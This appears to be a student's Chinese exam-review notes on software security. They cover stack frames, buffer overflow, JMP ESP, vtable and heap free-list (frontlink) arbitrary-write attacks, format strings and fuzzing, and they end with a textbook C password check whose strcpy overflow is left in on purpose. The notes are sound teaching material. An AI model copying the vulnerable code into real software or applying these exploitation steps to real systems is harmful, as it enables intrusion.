<p>ESP：<strong>扩展堆栈指针。</strong>这个寄存器<strong>指向堆栈的当前位置</strong>，并允许通过<strong>使用push和pop操作或者直接的指针操作</strong>来对堆栈中的内容进行添加和移除。</p>
<p>EBP：<strong>扩展基指针。</strong>主要用与<strong>存放在进入call以后的ESP的值</strong>，便于<strong>退出的时候回复ESP的值</strong>，达到<strong>堆栈平衡</strong>目的。</p>
<p>EIP：<strong>扩展指令指针。</strong>在<strong>调用一个函数</strong>时，这个指针被<strong>存储在堆栈中</strong>，用于后面的使用。在<strong>函数返回时</strong>，这个被存储的地址<strong>被用于决定下一个将被执行的指令的地址</strong>。</p>
<p><strong>7.代码注入</strong></p>
<p>攻击者将<strong>恶意代码注入到一个应用程序中</strong>，并使得<strong>这段代码在应用程序的上下文中被执行。</strong></p>
<p>8.弧注入</p>
<p>将<strong>控制转移</strong>到已经存在于<strong>程序内存空间中的代码</strong>中。</p>
<p>9.栈粉碎</p>
<p>由于<strong>向栈上的缓冲区写入过多数据</strong>而导致<strong>栈的正常结构被破坏</strong>的情况。</p>
<p>10.栈帧移位</p>
<p>程序<strong>重新被装入运行时</strong>，不同的<strong>环境</strong>会导致<strong>栈帧发生移位</strong>，先前查出的返回地址<strong>此时指向无效指令</strong>，<strong>静态的shellcode地址不能适应动态的内存变化</strong>。</p>
<p><strong>11.虚函数</strong></p>
<p>C++面向对象多态特性的重要机制。C++类的成员函数<strong>在声明时，</strong>若使用<strong>关键字virtual进行修饰</strong>，则被称为虚函数。</p>
<p>12.SEH </p>
<p><strong>异常处理结构体。</strong>每个SEH包含<strong>两个DWORD指针，SEH链表指针，异常处理函数句柄</strong>共8个字节。</p>
<p><strong>13.格式化输出</strong></p>
<p>格式化输出函数参数由<strong>一个格式字符串</strong>和<strong>可变数目的参数</strong>构成，格式化字符串提供了一组可以<strong>由格式化输出函数</strong>解释执行的指令，用户可以通过<strong>控制格式字符串的内容来控制格式化输出函数</strong>的执行。</p>
<p><strong>14.并行度</strong></p>
<p><strong>同一时刻实际并行执行的任务数量</strong>（例如多核同时执行多个线程）。与并发不同，<strong>并行强调同时运行。</strong></p>
<p><strong>15.堆栈缓冲区</strong></p>
<p>位于栈帧中的<strong>局部数组&#x2F;缓冲区</strong>（如char buf[200]）。其越界写可<strong>覆盖保存的返回地址、SEH结构</strong>等，典型利用为<strong>栈溢出。</strong></p>
<p><strong>16.异常抛出</strong></p>
<p>程序运行中<strong>发生异常事件并触发异常机制</strong>（如Windows SEH&#x2F;VEH&#x2F;未处理异常过滤器等），导致<strong>控制流转入异常处理路径</strong>；<strong>若异常处理结构可被覆盖，可能被利用执行任意代码。</strong></p>
<h3 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h3><p>1.对比植入shellcode中静态淹没返回地址与JMP ESP两种方式的优缺点。</p>
<p><strong>静态淹没返回地址</strong>：用大量<strong>重复的返回地址</strong>覆盖<strong>栈上返回地址区域</strong>（喷射&#x2F;淹没），通常配合<strong>NOP sled</strong>扩大命中。</p>
<p>优点：<strong>实现简单、对偏移误差容忍较高</strong>（可通过NOP&#x2F;重复地址提高命中）。</p>
<p>缺点：需要<strong>可预测的跳转目标地址</strong>；地址中若<strong>含0字节等可能受字符串函数限制</strong>；遇到栈随机化&#x2F;ASLR难度增加。</p>
<p><strong>JMP ESP方式</strong>：返回地址覆盖为<strong>某模块中的JMP ESP指令地址</strong>，使<strong>EIP跳到ESP指向处</strong>执行<strong>栈上shellcode，破坏栈帧结构。</strong></p>
<p>优点：不必精确知道<strong>shellcode绝对地址</strong>，只要<strong>能控制栈上内容</strong>；相对<strong>短跳转</strong>且结构清晰。</p>
<p>缺点：依赖<strong>可用的JMP ESP地址</strong>（受模块版本&#x2F;ASLR&#x2F;DEP影响）；仍可能<strong>受坏字符限制</strong>（写返回地址时）。</p>
<p>2.列举动态分配缓冲区的缺点。</p>
<ul>
<li><strong>易出现堆相关漏洞</strong>：使用后释放（UAF）、双重释放、堆溢出破坏链表指针等，利用面更复杂但后果严重。</li>
<li><strong>需要理解并依赖堆管理数据结构</strong>（如空闲链表、边界标志等），错误使用内存管理API可能引入漏洞。</li>
<li>在不同系统&#x2F;版本下<strong>堆布局与分配策略差异大</strong>，<strong>漏洞复现与稳定利用</strong>更困难，环境依赖强、调试复杂、易受缓解策略影响。</li>
<li><strong>可能导致内存耗尽</strong>：若分配大小由外部输入控制，攻击者可通过构造输入反复申请大量内存，造成拒绝服务（DoS）。</li>
<li><strong>性能开销较大：</strong>动态分配涉及堆管理、空闲块查找及合并等操作，相比静态分配效率较低。</li>
</ul>
<p>3.简述虚函数的实现，并试述利用虚表对虚函数开展攻击的过程。假设声明了一个类vf，具有160字节的成员变量buf和虚函数test，main函数中可以通过溢出修改虚表，据此作答。</p>
<p>实现机制：</p>
<p>(1) 编译器<strong>为含虚函数的类生成虚函数表 VTBL（函数指针数组）。</strong></p>
<p>(2) 每个对象内存起始处<strong>保存虚表指针 VPTR</strong>，调用虚函数时先取VPTR定位VTBL，<strong>再取对应槽位的函数指针执行</strong>，实现运行时动态派发。</p>
<p>攻击思路（溢出改VPTR&#x2F;改VTBL条目）：</p>
<p>需要两个连续创建对象：[VPTR][buf(160 bytes)],[VPTR][buf(160 bytes)]</p>
<p>(1) <strong>攻击者构造特殊载荷：</strong>将shellcode 写到 buff 起始位置，在 buff 末尾构造fake VTBL，其中 test指向shellcode 的地址。</p>
<p>(2) <strong>buff 溢出覆盖对象 VPTR，使其指向 fake VTBL</strong>。当 test 被调用时，<strong>程序通过修改的VPTR 定位到fake VTBL</strong>，进而找到其中test 地址（指向 shellcode），并<strong>把 shellcode 当 test 执行</strong>。</p>
<p>(3) 某些情况下也可能覆盖VTBL地址，<strong>将test函数入口地址直接改成shellcode。</strong></p>
<p>4.什么是空闲内存列表，画出其关键数据结构。</p>
<p>空闲内存列表是<strong>堆管理器</strong>用于<strong>记录并组织空闲堆块</strong>的数据结构。当<strong>调用free</strong>释放内存时，空闲块会被插入空闲链表；当<strong>调用malloc&#x2F;HeapAlloc</strong> 分配内存时，管理器会在空闲链表中查找合适大小的空闲块并将其<strong>取出或分裂</strong>。</p>
<p>在Windows RTL Heap 中，空闲块通常通过多个双向链表按大小类别组织（可表示为Freelist[] 的链表头数组），<strong>每个链表头为LIST_ENTRY</strong>：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image.png" alt="image.png"></p>
<p>当链表为空时，flink与blink都指向链表头自身。</p>
<p>5.不安全的API是导致字符串错误的重要原因，试列举并说明5个不安全的字符串API。</p>
<ul>
<li>strcpy(dst, src)：<strong>不检查长度，src过长直接溢出。</strong></li>
<li>strcat(dst, src)：<strong>不检查剩余空间，拼接可能越界。</strong></li>
<li>sprintf(buf, fmt, …)：<strong>不限制输出长度，格式化后可能写爆buf。</strong></li>
<li>gets(buf)：<strong>读取一行不做边界检查</strong>（经典栈溢出）。</li>
<li>scanf(“%s”, buf)：<strong>未限制宽度</strong>时可导致溢出（应使用%Ns）。</li>
</ul>
<p>6.先写出Fronklink技术实现代码，分析它给出实现攻击者提供4字节的数据写入到同样是攻击者指定的4字节地址的实例详细过程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK = bin;</span><br><span class="line">FD = BK-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (FD != BK) &#123;</span><br><span class="line"><span class="keyword">while</span> (FD != BK &amp;&amp; S &lt; chunksize(FD)) &#123;</span><br><span class="line">FD = FD-&gt;fd; <span class="comment">// ①</span></span><br><span class="line">&#125;</span><br><span class="line">BK = FD-&gt;bk; <span class="comment">// ②</span></span><br><span class="line">&#125;</span><br><span class="line">P-&gt;bk = BK;</span><br><span class="line">P-&gt;fd = FD;</span><br><span class="line">FD-&gt;bk = BK-&gt;fd = P <span class="comment">// ③</span></span><br></pre></td></tr></table></figure>

<p>利用空闲链表指针（flink&#x2F;blink）实现任意写的解释：释放后再写入已释放块的fp&#x2F;bp（等价flink&#x2F; blink），通过后续分配 &#x2F; 释放触发链表操作，完成覆盖目标地址为shellcode 地址，从而劫持控制流。</p>
<p>4 字节任意写过程（写“值&#x3D;bp”到“地址&#x3D;fp+4”）：</p>
<p>(1) 准备一个chunk, 其起始地址+12 为GOT表上HeapFree 函数地址-8。通过溢出修改FreeList 上的某个块（假设叫fifth）的fd为fake chunk。</p>
<p>(2) 将一个写有shellcode 的块释放（假设叫second）,second 的大小比 fifth 小, 那么会发生：成功进入while 语句, 在1 ⃝时 FD 被修改为Fakechunk 地址, 在2 ⃝时 BK被修改为HeapFree-8 地址, 在3 ⃝时BK+8, 也就是 HeapFree 被 Second 块地址替换，劫持 GOT 表。</p>
<p>7.请解释为什么格式化输出可能导致程序崩溃。</p>
<p><strong>(1) 栈参数错位 &#x2F; 读越界：</strong>格式化输出函数（如printf）是变参函数，运行时不检查参数数量和类型是否与格式字符串匹配。若格式串错误，函数会按格式说明从栈中取参数，可能读取非法数据并访问无效内存，导致程序崩溃。</p>
<p><strong>(2) %n 非法写内存：</strong>格式符%n会<strong>将已输出字符数写入指定地址</strong>，若该地址非法或不可写，会引发内存访问错误。</p>
<p><strong>(3) sprintf 缓冲区溢出：</strong>sprintf 不检查目标缓冲区大小，格式化结果过长会导致写越界，破坏相邻内存，从而造成程序异常或崩溃。</p>
<p>8.解释软件漏洞能够导致的后果有哪些？</p>
<p><strong>无法正常使用</strong>、引发<strong>恶性事件、关键数据丢失</strong>、<strong>秘密信息泄漏</strong>、<strong>被安装木马病毒</strong>。</p>
<p>9.简述Fuzz测试的思想，并描述针对文件的Fuzz测试的步骤和流程。</p>
<p><strong>技术思想：利用暴力</strong>来实现对目标程序的<strong>自动化测试</strong>，然后<strong>监视检查其最后的结果</strong>，如果<strong>符合某种情况</strong>就认为程序可能存在某种漏洞或者问题。暴力是利用<strong>不断地向目标程序发送</strong>或者<strong>传递不同格式的数据</strong>来测试目标程序的反应。</p>
<p><strong>文件格式Fuzz测试的基本方法：</strong></p>
<p>(1)以一个<strong>正常的文件模板</strong>作为基础，按照一定规则产生一批<strong>畸形文件</strong>。</p>
<p>(2)将畸形文件<strong>逐一送入软件进行解析</strong>，并<strong>监视软件是否会抛出异常</strong>。</p>
<p>(3)记录<strong>软件产生的错误信息</strong>，如<strong>寄存器状态、栈状态</strong>等。</p>
<p>(4)用<strong>日志或其他UI形式</strong>向测试人员<strong>展示异常信息</strong>，以进一步鉴定这些错误<strong>是否能被利用</strong></p>
<p>10.什么时候会发生整数溢出？</p>
<p><strong>当一个整数被增加超过其最大值或被减小小于其最小值时即会发生整数溢出，带符号和无符号的数都有可能发生溢出。</strong></p>
<p>（AI答案）当整数运算结果超过该类型的表示范围时发生：</p>
<ul>
<li>无符号：结果按<strong>模2^n回绕</strong>（回到0附近继续增加）</li>
<li>有符号：<strong>超过上界&#x2F;下界产生溢出</strong>。</li>
</ul>
<p>典型场景：len * sizeof(T)、count + header、(a+b)用于分配&#x2F;拷贝长度时超过最大值，导致分配过小继而越界写（与缓冲区漏洞强相关）。</p>
<p>11.说说什么是shellcode和exploit。并阐述他们关系。</p>
<p>shellcode是一段用于<strong>执行恶意操作</strong>的代码，exploit是<strong>一种技术或方法</strong>，<strong>用于发现和利用漏洞</strong>，以执行<strong>非预期</strong>的操作。</p>
<p>shellcode：通称<strong>缓冲区溢出攻击中植入进程的代码</strong>，广义上<strong>可以认为恶意代码。</strong></p>
<p>exploit：植入代码之前我们要做大量<strong>调试工作</strong>，弄清<strong>哪个输入会造成缓冲区溢出</strong>，计算<strong>函数返回地址和缓冲区的偏移并且淹没</strong>来使得shellcode得到执行。这个代码植入的过程就是漏洞利用，即exploit。</p>
<p>shellcode和exploit的关系<strong>：exploit一般以一段代码的形式出现</strong>，用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot的核心是<strong>淹没返回地址</strong>，劫持进程的控制权，之后跳转去执行shellcode。与shellcode具有一定的通用性不同，<strong>exploit往往是针对特定漏洞而言的</strong>。</p>
<h2 id="软件安全基础知识"><a href="#软件安全基础知识" class="headerlink" title="软件安全基础知识"></a>软件安全基础知识</h2><h3 id="软件安全漏洞基础"><a href="#软件安全漏洞基础" class="headerlink" title="软件安全漏洞基础"></a>软件安全漏洞基础</h3><p>1.漏洞：在软件逻辑缺陷中，有一部分如果被利用能够<strong>引起非常严重的后果</strong>。例如：SQL注入、跨站脚本、缓冲区溢出。我们通常把这类<strong>能够引起软件做一些超出设计范围的事情的bug</strong>称为漏洞。</p>
<p>2.漏洞与bug的区别：<strong>bug是功能性</strong>逻辑缺陷，<strong>漏洞是安全性</strong>逻辑缺陷。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/f0296dc1914e07b48aac0e9eb48324e.png" alt="f0296dc1914e07b48aac0e9eb48324e.png"></p>
<p>3.软件漏洞的种类（知道有哪些）</p>
<p><strong>（1）缓冲区溢出漏洞</strong>：由于用户处理用户数据时使用了<strong>不限边界的拷贝</strong>，导致程序内部一些<strong>关键数据被覆盖</strong>，引发了安全问题，严重的缓冲区溢出漏洞会使得<strong>程序被利用而安装上木马或病毒。</strong></p>
<p><strong>（2）整数溢出漏洞：</strong>对于有符号的16位整数来说，它的最大值就是0x7fff，也就是十进制的32767，当赋值给一个整数的值为其最大值时，如果此时<strong>再加上1</strong>，就会发生整数型的溢出。</p>
<p><strong>（3）格式化字符串漏洞：</strong>格式化字符串漏洞是由于<strong>程序的数据输出函数中对输出数据的格式解析不当</strong>而发生的。</p>
<p><strong>（4）SQL注入漏洞：</strong>通过<strong>控制传递给软件数据库操作语句的关键变量</strong>来获得<strong>恶意控制软件数据库、获取有用信息或者制造恶意破坏的</strong>，甚至是控制用户计算机系统的漏洞。</p>
<p>4.软件漏洞的危害：<strong>无法正常使用</strong>、引发<strong>恶性事件、关键数据丢失</strong>、<strong>秘密信息泄漏</strong>、<strong>被安装木马病毒</strong>。</p>
<p>5.安全漏洞出现的原因：<strong>小作坊式的软件开发</strong>、<strong>赶进度</strong>带来的弊端、被轻视的<strong>软件安全测试</strong>、淡薄的<strong>安全思想</strong>、不完善的<strong>安全维护</strong>。<strong>（从开发（小作坊、安全意识、赶进度）、测试、维护的角度）</strong></p>
<h3 id="漏洞利用技术"><a href="#漏洞利用技术" class="headerlink" title="漏洞利用技术"></a>漏洞利用技术</h3><p>1.shellcode与exploit的概念</p>
<p>Shellcode：指缓冲区溢出过程中植入进程的<strong>代码</strong></p>
<p>exploit：指代码植入过程，或<strong>漏洞利用过程</strong></p>
<p>（2）shellcode通常是Exploit的一部分，Exploit负责打开门，shellcode决定通过门后要做什么。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/6f82a48f934b55ea9b0635d5f039852.png" alt="6f82a48f934b55ea9b0635d5f039852.png"></p>
<p>2.定位shellcode，栈帧移位与jmp esp</p>
<p><strong>栈帧移位：</strong>指程序每次装入运行时，<strong>其地址会发生变换。</strong>由于<strong>移位</strong>的现象，导致<strong>静态地址</strong>的输入下，shellcode的注入攻击不能每次都成功，无法适应动态内存的变化。</p>
<p><strong>Jmp esp：</strong>由于上述静态地址输入情况下的弊端，可以<strong>借助ESP来适应内存动态变化</strong>！思想如下：由于ESP在每次函数执行完，函数栈帧清除时，指向返回地址的下一个位置，该相对位置不受栈帧移位的变化！那么，可以将shellcode注入在紧跟返回地址（返回地址被覆盖为JMP ESP）之后，并通过JMP ESP的方式，调用shellcode！该方法不受内存变化的影响。示意图如下：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%201.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%202.png" alt="image.png"></p>
<p>但是，上面这种shellcode放入缓冲区的布置，会有一些问题：万一系统进行push操作，可能会破坏shellcode数据！我们可以选择<strong>抬高栈顶（修改ESP）</strong>，以保护shellcode！或者，在shellcode之前添加<strong>多个NOP</strong>，增加“靶子面积”。同样地，如果retn指令不确定位置，也可以放置<strong>多个retn</strong>，以确保命中。</p>
<p>3.缓冲区的组成</p>
<p>（1）<strong>填充物：</strong>可以是任何值，但是一般<strong>用NOP指令对应的0x90</strong>来进行填充，这样只要能跳进填充区，处理器最终也能顺序执行到shellcode。</p>
<p>（2）<strong>淹没返回地址的数据</strong>：可以是<strong>跳转指令</strong>的地址，shellcode的起始地址，或者近似的shellcode地址。（跳转进NOP填充区）</p>
<p>（3）<strong>shellcode</strong>：可执行的<strong>机器代码</strong>。</p>
<h3 id="漏洞挖掘与模糊测试"><a href="#漏洞挖掘与模糊测试" class="headerlink" title="漏洞挖掘与模糊测试"></a><strong>漏洞挖掘与模糊测试</strong></h3><p>1.Fuzz测试（考12分大题，简述思想，描述针对文件的Fuzz测试步骤流程）</p>
<p>（1）Fuzz的主要目的：<strong>崩溃、中断、销毁。</strong></p>
<p>（2）测试用例往往是<strong>带有攻击性的畸形数据</strong>用以触发各种类型的漏洞。<strong>因为Fuzz往往可以触发一个缓冲区溢出的漏洞</strong>，但<strong>却不能实现有效的exploit。</strong>测试人员需要<strong>实时地捕捉目标程序抛出的异常、发生的崩溃和寄存器</strong>等信息，综合判断这些错误是不是真正的可利用漏洞。</p>
<p>（3）技术思想：<strong>利用暴力</strong>来实现对目标程序的<strong>自动化测试</strong>，然后<strong>监视检查其最后的结果</strong>，如果<strong>符合某种情况</strong>就认为程序可能<strong>存在某种漏洞或者问题</strong>。暴力是利用<strong>不断地向目标程序发送</strong>或者<strong>传递不同格式的数据</strong>来测试目标程序的反应。</p>
<p>（4）优缺点：优点是<strong>很少出现误报</strong>，<strong>能够迅速地找到真正的漏洞</strong>；缺点是<strong>Fuzz永远不能保证系统里已经没漏洞。</strong>即使我们用Fuzz找到了100个严重的漏洞，系统中仍然可能存在第101个漏洞。</p>
<p>2.文件格式Fuzz测试的基本方法步骤</p>
<p>（1）以一个<strong>正常的文件模板</strong>作为基础，按照一定规则产生一批<strong>畸形文件</strong>。</p>
<p>（2）将畸形文件<strong>逐一送入软件进行解析</strong>，并<strong>监视软件是否会抛出异常</strong>。</p>
<p>（3）记录<strong>软件产生的错误信息</strong>，如寄存器状态、栈状态等。</p>
<p>（4）用<strong>日志或其他UI形式向测试人员展示异常信息</strong>，以进一步<strong>鉴定这些错误是否能被利用</strong>。</p>
<h2 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h2><h3 id="缓冲区溢出知识"><a href="#缓冲区溢出知识" class="headerlink" title="缓冲区溢出知识"></a>缓冲区溢出知识</h3><p>1.缓冲区溢出：指当计算机<strong>向缓冲区内填充数据位数</strong>时<strong>超过了缓冲区本身的容量，</strong>溢出的数据<strong>覆盖在合法数据上。</strong>可通过修改下列参数来<strong>利用缓冲区溢出</strong>：<strong>变量、数据指针、函数指针、栈返回地址。</strong></p>
<h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><p>1.内存的不同用途：成功地利用缓冲区溢出漏洞<strong>可以修改内存中的变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。</strong></p>
<p><strong>2.寄存器相关知识</strong></p>
<p>（1）EAX一般<strong>用来做返回值</strong></p>
<p>（2）ECX用于<strong>记数</strong></p>
<p>（3）EIP：<strong>扩展指令指针。</strong>在<strong>调用一个函数</strong>时，这个指针被<strong>存储在堆栈中</strong>，用于后面的使用。在<strong>函数返回时</strong>，这个被存储的地址<strong>被用于决定下一个将被执行的指令的地址</strong>。</p>
<p>（4）ESP：<strong>扩展堆栈指针。</strong>这个寄存器<strong>指向堆栈的当前位置</strong>，并允许通过<strong>使用push和pop操作或者直接的指针操作</strong>来对堆栈中的内容进行添加和移除。</p>
<p>（5）EBP：<strong>扩展基指针。</strong>主要用与<strong>存放在进入call以后的ESP的值</strong>，便于<strong>退出的时候回复ESP的值</strong>，达到<strong>堆栈平衡</strong>的目的。</p>
<p><strong>3.进程使用的内存分类（填空题，考了n次）</strong></p>
<p>（1）<strong>代码区：</strong>存储着<strong>被装入执行的二进制机器代码</strong>，处理器会到这个区域取指并执行。</p>
<p>（2）<strong>数据区：存储全局变量</strong>等。</p>
<p>（3）<strong>堆区：</strong>进程可以<strong>在堆区动态地请求一定大小的内存</strong>，并在用完之后<strong>归还</strong>给堆区。<strong>动态分配和回收</strong>是堆区的特点。</p>
<p>（4）<strong>栈区：</strong>用于动态地<strong>存储函数之间的调用关系</strong>，以保证被调用函数在返回时恢复到父函数中继续执行。</p>
<p>4.函数调用的变化（知道栈帧存储顺序）</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%203.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%204.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%205.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%206.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%207.png" alt="image.png"></p>
<p>5.寄存器与函数栈帧</p>
<p>（1）每一个函数独占自己的<strong>栈帧空间</strong>。当前正在运行的函数的栈帧总是<strong>在栈顶</strong>。Win32系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧。</p>
<p>①ESP：<strong>栈指针寄存器</strong>，其内存放着一个指针，该指针永远指向<strong>系统栈最上面的一个栈帧的栈顶。</strong></p>
<p>②EBP：<strong>基址指针寄存器</strong>，其内存放着一个指针，该指针永远指向<strong>系统栈最上面的一个栈帧的底部。</strong></p>
<p>③EIP：<strong>指令寄存器，</strong>其内存放着一个指针，该指针永远指向一条<strong>等待执行的指令地址</strong>。可以说如果控制了EIP寄存器的内容，就控制了进程我们让<strong>EIP指向哪里，CPU就会去执行哪里的指令。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%208.png" alt="image.png"></p>
<p>（2）在函数栈帧中，一般包含以下几类重要信息。（考了n次）</p>
<p><strong>①参数</strong></p>
<p><strong>②局部变量：</strong>为函数局部变量<strong>开辟的内存空间。</strong></p>
<p><strong>③栈帧状态值：</strong>保存前<strong>栈帧的顶部和底部</strong>（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</p>
<p><strong>④函数返回地址：</strong>保存当前函数调用前的<strong>断点信息</strong>，也就是<strong>函数调用前的指令位置</strong>，以便在函数返回时能够<strong>恢复到函数被调用前的代码区中</strong>继续执行指令。</p>
<p>（这样记忆：从底到高，分别是retn函数返回地址、ebp栈帧状态值、局部变量。）</p>
<p>6.函数调用约定与相关指令</p>
<p><strong>（1）函数调用步骤</strong></p>
<p><strong>①参数入栈：</strong>将参数<strong>从右向左</strong>一次压入系统栈中。</p>
<p><strong>②返回地址入栈：</strong>将当前代码区<strong>调用指令的下一跳指令地址</strong>压入栈中，<strong>供函数返回时</strong>继续执行。</p>
<p><strong>③代码区跳转：</strong>处理器从当前代码区<strong>跳转到被调用函数的入口处</strong>。</p>
<p><strong>④栈帧调整：</strong>保存当前<strong>栈帧的状态值</strong>，以备后面恢复本栈帧时使用<strong>（EBP入栈）</strong>；将当前栈帧切换到新栈帧<strong>（将ESP值装入EBP，更新栈帧底部）</strong>；给新栈帧分配空间<strong>（把ESP减去所需空间的大小，抬高栈帧）</strong>。</p>
<p>（2）_stdcall调用约定的指令序列</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%209.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2010.png" alt="image.png"></p>
<p>（3）函数调用时系统栈的变化过程</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2011.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2012.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2013.png" alt="image.png"></p>
<p><strong>7.函数返回的步骤</strong></p>
<p>（1）<strong>保存返回值：</strong>通常将函数的返回值<strong>保存在寄存器EAX中。</strong></p>
<p>（2）<strong>弹出当前栈帧，恢复上一个栈帧，</strong>具体包括：在堆栈平衡的基础上，<strong>给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。</strong>将当前<strong>栈帧底部保存的前栈帧EBP值弹入EBP寄存器，</strong>恢复上一个栈帧。将函数返回地址<strong>弹给EIP寄存器</strong>。</p>
<p>（3）<strong>跳转</strong>：按照函数返回地址<strong>跳回母函数中</strong>继续执行。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2014.png" alt="image.png"></p>
<h3 id="修改邻接变量（实验部分）"><a href="#修改邻接变量（实验部分）" class="headerlink" title="修改邻接变量（实验部分）"></a>修改邻接变量（实验部分）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD “1234567”</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span>* password)</span>&#123;</span><br><span class="line"><span class="type">int</span> authenticated;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);<span class="comment">//字符串比较函数</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer,password);<span class="comment">//这里会发生溢出 //字符串复制函数</span></span><br><span class="line"><span class="keyword">return</span> authenticated;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(“please input password:”);</span><br><span class="line"><span class="built_in">scanf</span>(“%s”,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)&#123;</span><br><span class="line"><span class="built_in">printf</span>(“incorrect password!\n”);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(“Congratulations!You have passed the verification!\n”);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2015.png" alt="image.png"></p>
<p>1.修改邻接变量的原理</p>
<p>（1）authenticated为int类型，在内存中是一个DWORD，占4个字节。所以，如果让buffer数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
<p>（2）观察一下源代码不难发现，authenticated变量的值来源于<strong>strcmp函数的返回值</strong>，之后会返回给main函数作为<strong>密码验证成功与否的标志变量</strong>；当<strong>authenticated为0时，标识验证成功</strong>；反之则不成功。</p>
